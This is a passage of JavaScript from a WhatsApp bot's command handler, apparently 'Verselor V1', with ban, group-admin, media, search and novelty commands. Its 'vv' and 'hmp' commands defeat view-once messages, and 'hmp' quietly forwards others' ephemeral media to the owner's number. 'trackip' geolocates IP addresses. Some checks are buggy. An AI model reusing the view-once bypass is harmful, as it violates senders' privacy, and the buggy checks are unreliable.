Vreply(`*Successfully Banned ${orang.split('@')[0]} From Using This Bot*\n\n${footer}`)
} else {
return Vreply('Reply Or Tag A User To Be Banned')
}}
break;
//=================================================//


//=================================================//
case "unban": 
case "unbanuser":  {
if (!isOwner) return Vreply(mess.owner);
let Promise = ['2348137256404', '08166546725']
if (text) {
let orang = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
if (orang === BotNum) return Vreply('*I Was Never Never Banned*')
if (orang.includes(Promise) + "@s.whatsapp.net") return Vreply('*ACCESS DENIED*\n\nBot Developers Was Never Banned');
if (!ban.includes(orang)) return Vreply(`*${orang.split('@')[0]} is not among the banned users*`)
let indx = ban.indexOf(orang)
ban.splice(indx, 1); 
await global.db.write();
Vreply(`*${orang.split('@')[0]} has been unbanned, user can now use this bot*\n\n${footer}`)
} else {
return Vreply('Reply Or Tag A User To Be Unbanned')
}
}
break;
//=================================================//


//=================================================//
case "listban": 
case "listbanuser": {
if (!isOwner) return Vreply(mess.owner);
if (ban.length < 1) return Vreply("Couldn't Find Any Banned Users Yet")
let teksnya = `List Of Banned Users Here\n`
ban.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
await HeavstalTech.sendMessage(m.chat, {text: teksnya, mentions: [... ban]}, {quoted: m})
}
break;
//=================================================//


//=================================================//


//=================================================//
case "banchat": 
case "bangc":
case "ban-chat":
case "ban-gc": {
if (!m.isGroup) return Vreply(mess.only.group);
if (!isOwner) return Vreply(mess.owner);
let BOT_GROUP_ID = '120363421697115707' + '@g.us'
let GROUP = m.chat;
if (GROUP === BOT_GROUP_ID) return Vreply('*ACCESS DENIED*\n\nBot Group Cannot Be Banned.')
if (BANNED_GROUP.includes(GROUP)) return Vreply(`*PROCESS STOPPED*\n\nThis Group Has Already Been Banned\n\n${footer}`)
BANNED_GROUP.push(GROUP)
await global.db.write();
Vreply(`*Successfully Banned This Group From Using This Bot*\nThis Bot Will No Longer Carry On Activities Here\n\n${footer}`)
}
break;
//=================================================//


//=================================================//
case "unbanchat": 
case "unbangc":
case "unban-chat":
case "unban-gc": {
if (!m.isGroup) return Vreply(mess.only.group);
if (!isOwner) return Vreply(mess.owner);
let BOT_GROUP_ID = '120363421697115707' + '@g.us'
let GROUP = m.chat;
if (GROUP === BOT_GROUP_ID) return Vreply('*PROCESS STOPPED*\n\nBot Group Was Never Banned.')
let indx = BANNED_GROUP.indexOf(GROUP)
  if (indx > -1) {
        BANNED_GROUP.splice(indx, 1);
        await global.db.write();
    }
Vreply(`*Successfully Unbanned This Group*\nThis Bot Can Now Carry On Activities Here\n\n${footer}`)
}
break;
//=================================================//


//=================================================//
case 'sleep':
case 'sleepmode': {
    if (!isCreator) return Vreply(mess.owner);
    if (!text) return Vreply(`*Current Status:* ${global.sleep ? 'Sleeping 😴' : 'Awake 🟢'}\n\nUse: *${prefix}sleep on* or *${prefix}sleep off*`);
    if (args[0].toLowerCase() === 'on') {
        if (global.sleep) return Vreply("*Bot is already sleeping!* 💤");
        global.sleep = true;
        return Vreply(`*SLEEP MODE ACTIVATED*\n\nThe bot is now dormant. Only *${prefix}sleep off* will work.`);
    } else if (args[0].toLowerCase() === 'off') {
        if (!global.sleep) return Vreply("*Bot is already awake!* 🟢");
        global.sleep = false;
        return Vreply(`*SLEEP MODE DEACTIVATED*\n\nThe bot is now active and accepting commands.`);
    } else {
        return Vreply(`Invalid option. Use *on* or *off*.`);
    }
}
break;
//=================================================//


//=================================================//
case 'git': case 'gitclone': {
if (!args[0]) return Vreply(`Where is the link?\nExample :\n${prefix + command} https://github.com/repoOwner/repoName.git`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return Vreply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
 let [, user, repo] = args[0].match(regex1) || []
 repo = repo.replace(/.git$/, '')
 let url = `https://api.github.com/repos/${user}/${repo}/zipball`
 let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
 HeavstalTech.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => Vreply(mess.error))
 }
break;
//=================================================//


//=================================================//
case 'vv': {
 if (!m.quoted) return Vreply('Please reply to an image, video, or voice note (View Once included).');
 try {
 const mediaBuffer = await HeavstalTech.downloadMediaMessage(m.quoted);
 if (!mediaBuffer) { 
 return Vreply('⚠️ Failed to download media. Try again.'); 
 } 
 const mediaType = m.quoted.mtype; 
 if (mediaType === 'imageMessage') { 
 await HeavstalTech.sendMessage(m.chat, { 
 image: mediaBuffer, 
 caption: "*SUCCESS!* HERE IS YOUR VIEW ONCES IMAGE"
 }, { quoted: m });
 } else if (mediaType === 'videoMessage') { 
 await HeavstalTech.sendMessage(m.chat, { 
 video: mediaBuffer, 
 caption: "*SUCCESS!* HERE IS YOUR VIEW ONCES VIDEO" 
 }, { quoted: m });
 } else if (mediaType === 'audioMessage') { 
 await HeavstalTech.sendMessage(m.chat, { 
 audio: mediaBuffer, 
 mimetype: 'audio/ogg',
 ptt: true,
 caption: "*SUCCESS!* HERE IS YOUR VIEW ONCES AUDIO" 
 }, { quoted: m });
 } else { 
 return Vreply('⚠️ Unsupported format. Please reply to an image, video, or voice note.'); 
 }
 } catch (error) {
 console.error('Error:', error);
 await Vreply('⚠️ An error occurred. Try again.');
 }
}
break;
//=================================================//


//=================================================//
 case "hmp": case "vv2": case "readviewonce2": {
if (!isOwner) return Vreply(mess.owner);
    if (!m.quoted) {
        return Vreply(`*Reply to an image, video, or audio with the caption ${prefix + command}*`);
    }

    let quotedMsg = m.quoted?.msg?.viewOnceMessage?.message || m.quoted?.msg || m.quoted || {};
    let mime = quotedMsg.mimetype || '';
    
    if (!quotedMsg?.mediaKey) {
          return Vreply("*Process Failed*\n\nCannot Process This *ViewOnces* Message As It Has Already Been *Open/Viewed* By Bot Owner");
          }
    try {
        if (/image/.test(mime)) {
            let media = await m.quoted.download();
            await HeavstalTech.sendMessage(BotNum, {
                image: media,
                caption: " ",
            }, { quoted: m });

        } else if (/video/.test(mime)) {
            let media = await m.quoted.download();
            await HeavstalTech.sendMessage(BotNum, {
                video: media,
                caption: "",
            }, { quoted: m });

        } else if (/audio/.test(mime)) {
            let media = await m.quoted.download();
            await HeavstalTech.sendMessage(BotNum, {
                audio: media,
                mimetype: 'audio/mpeg', caption: '',
                ptt: true
            }, { quoted: m });
        } else {
            Vreply(`❌ Unsupported media type!\nReply to an image, video, or audio with *${prefix + command}*`);
        }
    } catch (err) {
        console.error('Error processing media:', err);
        Vreply(`❌ Failed to process media. Please try again.`);
    }
}
break;  
//=================================================//
    
    
    
//=================================================//
    case 'readmore': {
if (!text) return Vreply("*Where is the message?*\n\nExample: .readmore Verselor V1 Created By Heavstal Tech")
let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
await HeavstalTech.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;
//=================================================//


//=================================================//
case 'steal': 
case 'stickerwm': 
case 'take': 
case 'wm': {
    if (!quoted) return Vreply(`Reply to a sticker, image, or video!`);
    let [pname, auth] = text.split('|');
    let packname = pname || `𝐕𝐄𝐑𝐒𝐄𝐋𝐎𝐑 𝐕𝟏 ²⁶\n\n𝐇𝐄𝐀𝐕𝐒𝐓𝐀𝐋 𝐓𝐄𝐂𝐇`;
    let author = auth || `𝐕𝐄𝐑𝐒𝐄𝐋𝐎𝐑 𝐕𝟏 ²⁶`;
    const isAnimated = /video/.test(mime) || (quoted.msg && quoted.msg.isAnimated);
    try {
        let media = await HeavstalTech.downloadMediaMessage(quoted);
        if (isAnimated) {
            await HeavstalTech.sendVideoAsSticker(m.chat, media, m, { 
                packname: packname, 
                author: author 
            });
        } else {
            await HeavstalTech.sendImageAsSticker(m.chat, media, m, { 
                packname: packname, 
                author: author 
            });
        }
    } catch (e) {
        console.error(e);
        Vreply("Failed to convert/steal sticker. Please try again.");
    }
}
break;
//=================================================//


//=================================================//
	case 'tts':
case 'say':
case 'speak': {
    if (!text) return Vreply(`*Please Provide Text*\n\nExample: ${prefix + command} Hello World\nExample with Lang: ${prefix + command} fr Bonjour`);
    let lang = 'en';
    let content = text.trim();
    const args = text.split(' ');
    if (args[0].length === 2) {
        lang = args[0];
        content = args.slice(1).join(' ');
    }

    if (!content) return Vreply(`*Please provide text after the language code.*`);
    Vreply(mess.wait)
await loading(); // kill it if you don't have 
    
    try {
        const apiKey = HT_API_KEY 
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/tts', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ 
                text: content,
                lang: lang
            })
        });

        const res = await response.json();
        if (res.status === 'success' && res.data && res.data.url) { 
            await HeavstalTech.sendMessage(m.chat, {
                audio: { url: res.data.url },
                mimetype: 'audio/mp4',
                ptt: true 
            }, { quoted: m });
        } else {
            await Vreply(`*TTS Failed*\n\n${res.error || 'Could not generate audio.'}`);
        }
    } catch (e) {
        console.error("TTS Command Error:", e);
        Vreply(`*Error:* An unexpected error occurred.`);
    }
}
break;
//=================================================//
        

//=================================================//        
case 'setbotimg':
case 'setbotimage': 
case 'set-botimage': 
case 'set-botimg': {                       
            if (!isCreator) return Vreply(mess.owner)
            if (!text) return Vreply(`Provide an image url to set as bot thumbnail\n\n${footer}`)
            if (!isUrl) return Vreply("This is not a valid image url");
                global.thumbnail = text
                global.menu = 'v2'
                Vreply(`*Bot Thumbnail Successfully Updated*\n\nType .menu to see newest bot image\n\n${footer}`)
                console.log(`SYSTEM UPDATE: Bot Thumbnail Has Ben Changed To ${text}`)
                }
                break;
//=================================================//                



//=================================================//
case 'setmenustyle':
case 'setms':
case 'setmenus': {
            if (!isCreator) return Vreply(mess.owner)
            if (!text) return Vreply(`Provide a valid menu style to continue\n*Exmaple:*${prefix + command}v2\n*Note:* The only currently available menu styles are \`v1\`, \`v2\`, \`v3\`\n\n${footer}`)
         if (text !== 'v1' && text !== 'v2' && text !== 'v3') return Vreply(`This is not a valid menu style, please select \`v1\`, \`v2\`, or \`v3\` to proceed\n\n${footer}`)
                global.menu = text
                Vreply(`Menu Style Successfully Updated*\n\nType .menu to see newest bot menu\n\n${footer}`)
                console.log(`SYSTEM UPDATE: Bot Menu Style Has Ben Changed To ${text}`)
                }
                break;   
//=================================================//                 


//=================================================//                             
case 'setprefix':
case 'set-prefix': {           
            if (!isCreator) return Vreply(mess.owner)
            if (!text) return Vreply(`*PROCESS ERROR*\n\nEnter Your Desired Prefix To Set Prefix (e.g #, /, +, ✓, &, !, ?), *DO NOT SELECT A NULL PREFX*\n\n*Example:* ${prefix + command}#`)
                global.prefix = text
                Vreply(`*Prefix Successfully Changed To ${text}*`)
                console.log(`SYSTEM UPDATE: Bot Prefix Has Ben Changed To ${text}`)
                }
                break;
//=================================================//                
      
                              
                                                                              
//=================================================//
case 'setalive':
case 'set-alive': {            
            if (!isCreator) return Vreply(mess.owner)
            if (!text) return Vreply(`*INVALID INPUT*\n\nPlease Provide A Message To Be Set As Alive Message\n*EXMAPLE:* ${prefix + command} Verselor-V1 By Heavstal Tech`)
                global.AliveMsg = text
                Vreply(`*Successfully Changed Alive Message*\n\n*NEW MESSAGE:* ${text}`)
                console.log(`SYSTEM UPDATE: Alive Message Has Ben Changed To ${text}`)
                }
                break;                
//=================================================//


//=================================================//      
case 'tiktok':
case 'tt':
case 'ttsearch':
case 'tiktoksearch': 
case 'ttvid':
case 'ttdl': 
case 'ttsearch': {
    if (!text) return Vreply(`*Please Provide a TikTok Link or Search Query*\n\nExample Download: ${prefix + command} https://vm.tiktok.com/xxxx\nExample Search: ${prefix + command} funny cat videos`);
    Vreply(mess.wait)
await loading(); // kill it if you don't have

    try {
        const apiKey = HT_API_KEY 
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/tiktok', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ query: text.trim() })
        });

        const res = await response.json();
        if (res.status === 'success' && res.data) {
            const { title, author, video_nowm, stats } = res.data;
            const caption = `*🎥 TikTok Downloader*\n\n` +
                            `📌 *Title:* ${title || 'No Title'}\n` +
                            `👤 *Author:* ${author || 'Unknown'}\n` +
                            `👁️ *Views:* ${stats?.views || 0}\n` +
                            `❤️ *Likes:* ${stats?.likes || 0}\n\n`;
            
            await HeavstalTech.sendMessage(m.chat, {
                video: { url: video_nowm },
                caption: caption
            }, { quoted: m });
        } else {
            await Vreply(`*Request Failed*\n\nCould not find any video. Please check your link or try a different search query.`);
        }
    } catch (e) {
        console.error("TikTok Downloder Error:", e);
        Vreply(`*Error:* An unexpected error occurred while connecting to TikTok.`);
    }
}
break;
//=================================================//


//=================================================//
case 'truth':
case 'dare':
case 'tod': {
    Vreply(mess.wait)
await loading();
    try {
        let type = command;
        if (command === 'tod') {
            type = Math.random() > 0.5 ? 'truth' : 'dare';
        }
        const apiKey = HT_API_KEY
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/truth-dare', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'x-api-key': apiKey },
            body: JSON.stringify({ type: type })
        });
        const res = await response.json();
        if (res.status === 'success') {
            await HeavstalTech.sendMessage(m.chat, {
                image: { url: res.data.image },
                caption: `*${res.data.type.toUpperCase()}* 🎯\n\n${res.data.result}`
            }, { quoted: m });
        } else {
            Vreply('Failed to fetch game data.');
        }
    } catch (e) {
        Vreply('Game Error.');
    }
}
break;
//=================================================//


//=================================================//
case 'weather':
case 'forecast':
case 'temp': {
    if (!text) return Vreply(`*Please Provide A City Name*\n\nExample: ${prefix + command} Lagos`);
    Vreply(mess.wait)
await loading(); // kill it if you don't have

    try {
        const apiKey = HT_API_KEY 
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/weather', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ city: text.trim() })
        });

        const res = await response.json();
        if (res.status === 'success' && res.data) {
            const { location, temp_c, temp_f, condition, humidity, wind } = res.data;
            const weatherText = `*☁️ Weather Info*\n\n` +
                                `📍 *Location:* ${location}\n` +
                                `🌡️ *Temperature:* ${temp_c}°C / ${temp_f}°F\n` +
                                `🌥️ *Condition:* ${condition}\n` +
                                `💧 *Humidity:* ${humidity}\n` +
                                `💨 *Wind:* ${wind}\n\n` +
                                `${footer}`;

            await HeavstalTech.sendMessage(m.chat, {
                text: weatherText
            }, { quoted: m });
        } else {
            await Vreply(`*Weather Not Found*\n\nCould not fetch weather data for "${text}", Try Somewhere Else`);
        }
    } catch (e) {
        console.error("Weather Error:", e);
        Vreply(`*Error:* An unexpected error occurred while fetching the weather info`);
    }
}
break;
//=================================================//


//=================================================//
case 'lyrics':
case 'lyric': {
    if (!text) return Vreply(`*Please provide a song name*\n\nExample: ${prefix + command} Mockingbird Eminem`);
    Vreply(mess.wait)
await loading(); // kill it if you don't have it

    try {
        const apiKey = HT_API_KEY
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/lyrics', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ 
                query: text.trim() 
            })
        });

        const res = await response.json();
        if (res.status === 'success' && res.data) {
            const { title, artist, image, lyrics, url } = res.data;
            const caption = `*🎵 Lyrics Search*\n\n` +
                            `📌 *Title:* ${title}\n` +
                            `👤 *Artist:* ${artist}\n` +
                            `🔗 *Source:* ${url}\n\n` +
                            `*📝 Lyrics:*\n${lyrics}`;
            if (image) {
                await HeavstalTech.sendMessage(m.chat, {
                    image: { url: image },
                    caption: caption
                }, { quoted: m });
            } else {
                await Vreply(caption);
            }
        } else {
            await Vreply(`*Lyrics Not Found*\n\n${res.error || 'Could not find lyrics for this song.'}`);
        }
    } catch (e) {
        console.error("Lyrics Command Error:", e);
        Vreply(`*Error:* An unexpected error occurred.`);
    }
}
break;
//=================================================//


//=================================================//        
case 'yts':
case 'ytsearch': {
    if (!text) return Vreply(`*Please Provide a Search Query*\n\nExample: ${prefix + command} Coding tutorials`);
    Vreply(mess.wait)
await loading(); // kill it if you don't have it.

    try {
        const results = await search.youtube(text.trim());
        if (results && results.length > 0) {
            const videos = results.filter(v => v.type === 'video').slice(0, 10);
            let msg = `*🔎 YouTube Search: ${text}*\n\n`; 
            videos.forEach((v, i) => {
                msg += `*${i + 1}.* ${v.title}\n` +
                       `   🕒 ${v.timestamp} | 👁️ ${v.views}\n` +
                       `   🔗 ${v.url}\n\n`;
            });

            await HeavstalTech.sendMessage(m.chat, {
                image: { url: videos[0].thumbnail }, 
                caption: msg
            }, { quoted: m });

        } else {
            await Vreply(`*No Results Found*`);
        }
    } catch (e) {
        console.error("YTSearch Error:", e);
        Vreply(`*Error:* Search failed.`);
    }
}
break;
//=================================================//
      
      
//=================================================//
case 'linkgroup': 
case 'linkgc':
case 'gclink': {
if (!m.isGroup) return Vreply(mess.only.group)
if (m.isGroup && !isBotAdmin) return Vreply(mess.badm)
let response = await HeavstalTech.groupInviteCode(from)
HeavstalTech.sendText(from, `*Successfully Featched Group Link*\n
┃━ ${MenuStyle} *Group Link:* https://chat.whatsapp.com/${response}
┃━
┃━ ${MenuStyle} *Link Group:* ${groupMetadata.subject}
`, m, { detectLink: true })
}
break;
//=================================================//

//=================================================//
case 'gcbot': 
case 'botgc': 
case 'botgroup': {
let ResponseText = `- *OFFICIAL VERSELOR V1 GROUP CHAT ✅*\n\n>JOIN TO GET IMPORTANT UPDATES FROM HEAVSTAL TECH: https://chat.whatsapp.com/HlfH698T5LAICbpQV5A5ku?mode=wwt`;
Vreply(mess.wait + "\nFeatching the latest gc link");
await loading();
Vreply(ResponseText);
}
break;
//=================================================//


//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!m.isGroup) return Vreply(mess.only.group)
if (m.isGroup && !isAdmin) return ("ᴏɴʟʏ ᴀᴅᴍɪɴs ᴄᴀɴ ᴀᴄᴄᴇss ᴛʜɪs ғᴇᴀᴛᴜʀᴇ")
if (!/image/.test(mime)) throw `Send/reply image with caption ${prefix + command}`
if (/webp/.test(mime)) throw `Send/reply image with caption ${prefix + command}`
let media = await HeavstalTech.downloadAndSaveMediaMessage(m)
await HeavstalTech.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
Vreply('*Successfully Updated Group Profile Picture\n\nᴘᴏᴡᴇʀᴇᴅ ʙʏ ʜᴇᴀᴠsᴛᴀʟ ᴛᴇᴄʜ')
}
break;
//=================================================//


//=================================================//
case 'creategc':
case 'create-group':
case 'create-gc':
case 'creategroup': {
    if (!isOwner) return Vreply(mess.owner);
    if (!args.join(" ")) return Vreply(`Provide A Group Name\n\nExample: ${prefix+command} <groupname>`);
    
    try {
        let cret = await HeavstalTech.groupCreate(args.join(" "),[]);
        let response = await HeavstalTech.groupInviteCode(cret.id);
        let creationTimestamp = cret.creation ? (cret.creation * 1000) : Date.now();
        let creationDate = new Intl.DateTimeFormat('en-GB', {
            timeZone: global.timezone || 'Africa/Lagos',
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        }).format(new Date(creationTimestamp));
        
        creationDate = creationDate.replace(',', '');

        let teks2 = `[ ${cret.subject} ]

▸ Name : ${cret.subject}
▸ Owner : @${(cret.owner || m.sender).split("@")[0]}
▸ Creation : ${creationDate}
▸ Group Id : ${cret.id}
▸ Join : https://chat.whatsapp.com/${response}`;
        
        Vreply(teks2);
    } catch (err) {
        console.error("Create GC Error:", err);
        Vreply("*Successfully Created Group Chat!* (But failed to fetch invite link)");
    }
}
break;
//=================================================//


//=================================================//
case 'approveall': {
    try {
        await HeavstalTech.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        if (!m.isGroup) {
            return await HeavstalTech.sendMessage(m.chat, {
                text: '*Group Only*',
                react: { text: '❌', key: m.key }
            }, { quoted: m });
        }
        
        if (!(await Adm(m.chat, m.sender, HeavstalTech))) {
            return await HeavstalTech.sendMessage(m.chat, {
                text: '*Only Admins Can Access This Feature!*',
                react: { text: '❌', key: m.key }
            }, { quoted: m });
        }

        // Get pending requests
        const requests = await HeavstalTech.groupRequestParticipantsList(m.chat);
        if (requests.length === 0) {
            return await HeavstalTech.sendMessage(m.chat, {
                text: '*No Available Pending Requests*',
                react: { text: 'ℹ️', key: m.key }
            }, { quoted: m });
        }

        // Approve all requests
        const requestIds = requests.map(r => r.jid);
        await HeavstalTech.groupRequestParticipantsUpdate(m.chat, requestIds, 'approve');

        const approvedText = `
*Successfully Approved All Pending Requests*
 *Count*: ${requestIds.length}`;

                 const message = {
            text: approvedText,
            contextInfo: {
                forwardingScore: 9,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363402853491560@newsletter",
                    newsletterName: "𝐇𝐄𝐀𝐕𝐒𝐓𝐀𝐋 𝐓𝐄𝐂𝐇",
                    serverMessageId: 272,
                    newsletterThumbnail: {
                        thumbnailUrl: "https://files.catbox.moe/g8pxls.png"
                    }
                },
                externalAdReply: {
                    title: '𝐕𝐄𝐑𝐒𝐄𝐋𝐎𝐑 𝐕𝟏 ²⁶',
                    body: '𝐕𝐄𝐑𝐒𝐄𝐋𝐎𝐑 𝐕𝟏 ²⁶',
                    thumbnailUrl: "https://files.catbox.moe/g8pxls.png",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        };

        await HeavstalTech.sendMessage(m.chat, message, { quoted: m });
        await HeavstalTech.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error("ApproveAll Error:", error);
        await HeavstalTech.sendMessage(m.chat, { 
            text: "*Failed To Approve Requests*!",
            react: { text: '❌', key: m.key }
        }, { quoted: m });
    }
}
break;
//=================================================//


//=================================================//
case 'calculator':
case 'calc':
case 'calculate': {
    if (!text) return Vreply(`*Please Provide an Expression*\n\nExample: ${prefix + command} 50 + 20\nExample: ${prefix + command} 10 km to miles`)
    Vreply(mess.wait)
await loading()
    try {
        const apiKey = HT_API_KEY
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/calc', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ expr: text.trim() })
        })

        const res = await response.json()
        if (res.status === 'success' && res.data) {
            const { expression, result } = res.data
            await Vreply(`*🔢 Heavstal Calculator*\n\n*Input:* ${expression}\n*Result:* ${result}`)
        } else {
            await Vreply(`*Calculation Failed*\n\n${res.error || 'Invalid expression or syntax error.'}`)
        }
    } catch (e) {
        console.error("Calculator Command Error:", e)
        Vreply(`*Error:* An unexpected error occurred.`)
    }
}
break;
//=================================================//


//=================================================//
case 'tovv': case 'toviewonce': { 
if (!quoted) return Vreply(`Reply Image/Video`)
if (/image/.test(mime)) {
anuan = await HeavstalTech.downloadAndSaveMediaMessage(quoted)
HeavstalTech.sendMessage(m.chat, {image: {url:anuan}, caption: `ʏᴏᴜʀ ᴠɪᴇᴡ ᴏɴᴄᴇ ᴍᴇssᴀɢᴇ ʙʏ ᴠᴏɪᴅ\n\nᴘᴏᴡᴇʀᴇᴅ ʙʏ ʜᴇᴀᴠsᴛᴀʟ ᴛᴇᴄʜ`,fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await HeavstalTech.downloadAndSaveMediaMessage(quoted)
HeavstalTech.sendMessage(m.chat, {video: {url:anuanuan}, caption: `ʏᴏᴜʀ ᴠɪᴇᴡ ᴏɴᴄᴇ ᴍᴇssᴀɢᴇ ʙʏ ᴠᴏɪᴅ\n\nᴘᴏᴡᴇʀᴇᴅ ʙʏ ʜᴇᴀᴠsᴛᴀʟ ᴛᴇᴄʜ`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break;
//=================================================//


//=================================================//
case 'owner':
case 'creator': {
const kontak = {
"displayName": 'ᏢᎡϴᎷᏆՏᎬ',
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN: ${global.ownername}\nitem1.TEL;waid=${lordpromise}:${lordpromise}\nitem1.X>ABLabel:\nPlease Don't Spam My Owner\nURL;Email Owner:${global.ownername}@gmail.com\nORG: THIS IS MY OWNER\nEND:VCARD`
}
await HeavstalTech.sendMessage(from, {
contacts: { contacts: [kontak] },
contextInfo:{ forwardingScore: 999, isForwarded: false, mentionedJid:[sender],
"externalAdReply":{
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": Styles(`ᎷᎡ. ᏢᎡϴᎷᏆՏᎬ`), 
"containsAutoReply": true,
"mediaType": 1, 
"jpegThumbnail": "https://files.catbox.moe/g8pxls.png",
"mediaUrl": `https://files.catbox.moe/g8pxls.png`,
"sourceUrl": `https://whatsapp.com/channel/0029VbBcg80KwqSR7dr7do1D`
}}}, { quoted: m })
}
break;

case "owner2": 
case "creator2": {
await HeavstalTech.sendContact(m.chat, ['2348166546725'], m)
}
break;
//=================================================//


//=================================================//
case 'track-ip':
case 'trackip': {
    if (!q) return Vreply(`*⚠️ Please provide a valid IP address*\n*📌 Example: .ip <Your IP Address>*`);
    try {
        const response = await fetch(`https://ipapi.co/${q}/json/`);
        const data = await response.json();

        if (data.error) return Vreply('*❌ Invalid IP address provided.*');

        const ipInfo = `📍 *IP Address Information*
────────────────────
• 🌐 *IP:* ${data.ip}
• 🧷 *Network:* ${data.network || '-'}
• 🔢 *Version:* ${data.version || '-'}
• 🏙️ *City:* ${data.city || '-'}
• 🗺️ *Region:* ${data.region || '-'}
• 🌎 *Country:* ${data.country_name || '-'} (${data.country_code || '-'})
• 🌍 *Continent Code:* ${data.continent_code || '-'}
• ⏰ *Timezone:* ${data.timezone || '-'}
• 🕒 *UTC Offset:* ${data.utc_offset || '-'}
• ☎️ *Calling Code:* ${data.country_calling_code || '-'}
• 💱 *Currency:* ${data.currency_name || '-'} (${data.currency || '-'})
• 🗣️ *Languages:* ${data.languages || '-'}
• 🏢 *ISP/ORG:* ${data.org || '-'}
• #️⃣ *ASN:* ${data.asn || '-'}
• 🗺️ *Google Maps:* https://www.google.com/maps?q=${data.latitude || '0'},${data.longitude || '0'}
────────────────────`;

        await Vreply(ipInfo);
    } catch (err) {
        console.error(err);
        Vreply('*❗ Failed to fetch IP information.*');
    }
}
break;
//=================================================//


//=================================================//
case 'checkme': {
 const args = text.split(" ");
 const bet = `${sender}`;
 const sifat = ['🤔 Fine','😡 Unfriendly','👎 Chapri','💔 Nibba/nibbi','😤 Annoying','💀 Dilapidated','😡 Angry person','😊 Polite','🙄 Burden','💯 Great','🤮 Cringe','🤥 Liar'];
 const hoby = ['🍳 Cooking','💃 Dancing','🎮 Playing','🎮 Gaming','🎨 Painting','🤝 Helping Others','🍿 Watching anime','📚 Reading','🚴‍♂️ Riding Bike','🎤 Singing','💬 Chatting','😂 Sharing Memes','✍️ Drawing','💸 Eating Parents Money','🎲 Playing Truth or Dare','🤫 Staying Alone'];
 const bukcin = [...Array(100).keys()].map(i => String(i + 1));
 const arp = bukcin.slice();
 const cakep = ['✅ Yes','❌ No','😖 Very Ugly','😍 Very Handsome'];
 const wetak = ['💖 Caring','💎 Generous','😡 Angry person','😔 Sorry','🤲 Submissive','😊 Fine','🙇‍♂️ Im sorry','🧡 Kind Hearted','😌 Patient','🥰 UwU','🔥 Top','🤗 Helpful'];
 const baikk = bukcin.slice();
 const bhuruk = bukcin.slice();
 const cerdhas = bukcin.slice();
 const berhani = bukcin.slice();
 const mengheikan = bukcin.slice();
 const sipat = sifat[Math.floor(Math.random() * sifat.length)];
 const biho = hoby[Math.floor(Math.random() * hoby.length)];
 const bhucin = bukcin[Math.floor(Math.random() * bukcin.length)];
 const senga = arp[Math.floor(Math.random() * arp.length)];
 const chakep = cakep[Math.floor(Math.random() * cakep.length)];
 const watak = wetak[Math.floor(Math.random() * wetak.length)];
 const baik = baikk[Math.floor(Math.random() * baikk.length)];
 const burug = bhuruk[Math.floor(Math.random() * bhuruk.length)];
 const cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)];
 const berani = berhani[Math.floor(Math.random() * berhani.length)];
 const takut = mengheikan[Math.floor(Math.random() * mengheikan.length)];

 const profile = `
*≡══《 Check @${bet.split('@')[0]} 》══≡*
*🤖 Bot Name: ${botname}*
*🧑‍🤝‍🧑 𝗡𝗮𝗺𝗲:* ${m.pushName}
*⚡ 𝗖𝗵𝗮𝗿𝗮𝗰𝘁𝗲𝗿𝗶𝘀𝘁𝗶𝗰:* ${sipat}
*🎨 𝗛𝗼𝗯𝗯𝘆:* ${biho}
*💖 𝗦𝗶𝗺𝗽𝗹𝗲𝗻𝗲𝘀𝘀 (Simp):* ${bhucin}%
*💥 𝗚𝗿𝗲𝗮𝘁𝗻𝗲𝘀𝘀:* ${senga}%
*🌟 𝗛𝗮𝗻𝗱𝘀𝗼𝗺𝗲:* ${chakep}
*💬 𝗖𝗵𝗮𝗿𝗮𝗰𝘁𝗲𝗿:* ${watak}
*🌱 𝗚𝗼𝗼𝗱 𝗠𝗼𝗿𝗮𝗹𝘀:* ${baik}%
*😈 𝗕𝗮𝗱 𝗠𝗼𝗿𝗮𝗹𝘀:* ${burug}%
*🧠 𝗜𝗻𝘁𝗲𝗹𝗹𝗶𝗴𝗲𝗻𝗰𝗲:* ${cerdas}%
*🔥 𝗖𝗼𝘂𝗿𝗮𝗴𝗲:* ${berani}%
*😱 𝗔𝗳𝗿𝗮𝗶𝗱:* ${takut}%

*≡═《𝗖𝗵𝗲𝗰𝗸 𝗽𝗿𝗼𝗽𝗲𝗿𝘁𝗶𝗲𝘀》═≡*
`;

